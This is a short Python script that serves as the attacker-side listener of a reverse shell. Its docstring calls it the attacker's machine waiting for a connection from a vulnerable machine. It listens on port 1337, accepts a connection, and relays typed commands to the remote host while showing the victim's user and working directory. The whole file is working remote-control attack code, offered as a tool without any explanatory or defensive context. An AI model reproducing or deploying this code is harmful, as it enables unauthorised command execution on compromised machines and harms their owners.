"""
Attacker's local machine acts as a server waiting for connections from the vulnerable machine.
"""
import socket
import logging

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 1337
BUFFER_SIZE = 1024 * 128
# For hackers only 
DELIMITER = "<hacker>"

def main():
	logging.info("REVERSE SHELL")
	print("hi")

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind((SERVER_HOST, SERVER_PORT))
	logging.info("Server bound...")

	sock.listen()
	logging.info("Server listening...")

	client_conn, addr = sock.accept()
	logging.info("Client {} connected.".format(addr))
	shell(client_conn)

def shell(conn):
	logging.info("Started shell session.")
	cwd, user, output = conn.recv(BUFFER_SIZE).decode().split(DELIMITER)

	while True:
		# Get CWD and user to simulate a real shell
		shell_cmd = input("{}@{}$ ".format(user, cwd))

		if shell_cmd == "exit":
			break

		conn.sendall(shell_cmd.encode())
		try:
			cwd, user, output = conn.recv(BUFFER_SIZE).decode().split(DELIMITER)
		except ValueError:
			pass
		print(output)

	logging.info("Shell session terminated")
	conn.close()


if __name__ == '__main__':
	logger = logging.getLogger()
	logging.basicConfig(level=logging.INFO)

	main()
